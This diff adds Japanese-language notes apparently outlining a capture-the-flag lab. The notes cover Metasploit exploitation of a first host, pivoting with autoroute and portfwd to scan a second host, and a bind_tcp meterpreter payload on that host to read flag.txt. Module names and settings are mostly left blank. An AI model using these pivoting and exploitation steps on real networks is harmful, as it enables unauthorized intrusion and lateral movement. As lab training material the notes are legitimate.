@@ -1,0 +1,34 @@
+1) ping
+2) nmap
+3) msfconsoleを起動する
+4) search 
+5) use 
+6) set
+7) exploitでmeterpreterを起動する
+8) ipconfigで対象のIPアドレスを確認する
+9) run autoroute -s 1台目のIPアドレス
+10) backgroundで実行する
+11) search portscan
+12) use 
+13) set
+14) set PORTS 1-100
+15) exploit
+16) リモートポート80をローカルポート1234に転送し、nmapを使ってバナーを取得する
+sessions
+sessions -i 1
+portfwd add -l 1234 -p 80 -r ターゲット2のIPアドレス
+portfwd list
+17) 新しいターミナルを開いて、nmapを実行する
+nmap -sV -sS -p 1234 localhost
+18) meterpreterに戻って、以下のコマンドを実行する
+background
+search
+use 
+set PAYLOAD windows/meterpreter/bind_tcp
+set
+exploit
+19) フラグを検索する
+shell
+cd /
+dir
+type flag.txt
